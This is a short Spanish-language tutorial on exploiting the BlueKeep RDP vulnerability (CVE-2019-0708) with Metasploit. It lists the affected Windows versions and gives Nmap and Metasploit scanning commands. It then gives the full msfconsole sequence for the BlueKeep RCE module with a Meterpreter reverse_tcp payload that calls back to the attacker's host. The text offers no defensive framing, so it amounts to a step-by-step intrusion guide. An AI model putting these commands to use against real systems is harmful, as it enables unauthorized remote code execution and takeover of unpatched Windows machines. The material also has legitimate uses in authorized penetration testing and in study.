# Explotación de RDP con BlueKeep (CVE-2019-0708) en Metasploit

## 1️⃣ ¿Qué es BlueKeep?

- **CVE-2019-0708 (BlueKeep)** es una vulnerabilidad crítica en RDP que permite **ejecución remota de código sin autenticación**.
- Afecta a:
  - Windows XP
  - Windows 7
  - Windows Server 2003
  - Windows Server 2008 / 2008 R2
- NO afecta a:
  - Windows 8/8.1
  - Windows 10
  - Windows Server 2012/2016/2019
- Si el servidor tiene **NLA activado**, BlueKeep no funciona.

---

## 2️⃣ Cómo identificar si un host es vulnerable

### Escanear con Nmap:
```
nmap -p 3389 --script rdp-ntlm-info <IP_OBJETIVO>
```
Te dirá la versión de Windows y si tiene NLA activado.

### Escanear con Metasploit:
```
msfconsole
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <IP_OBJETIVO>
run
```
Si el módulo dice que es vulnerable, puedes intentar explotarlo.

---

## 3️⃣ Explotar con Metasploit

### Módulo de explotación:
```
exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

### Pasos completos:
```
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <IP_OBJETIVO>
set RPORT 3389
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <TU_IP>
set LPORT 4444
exploit
```
